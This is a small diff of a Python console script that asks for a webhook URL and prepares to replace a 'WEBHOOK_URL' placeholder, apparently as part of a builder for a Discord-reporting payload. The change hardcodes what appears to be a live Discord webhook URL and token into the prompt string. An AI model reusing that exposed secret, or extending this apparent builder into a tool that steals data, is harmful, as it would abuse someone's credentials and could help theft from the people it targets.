@@ -9,7 +9,7 @@ os.system("color b")
 os.system("cls")
 
 def main():
-    webhook = input("[Enter your webhook URL]:> ")
+    webhook = input("[https://discord.com/api/webhooks/1349223901879730227/NWSNx6kF1xv0G1wPgwTrdPh_5JwdFWpHXxAOaW3VPFkfCBOg4WtlG65s7g3EshyA1ydK]:> ")
     global search_text
     global replace_text
     search_text = "WEBHOOK_URL"
@@ -113,3 +113,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+
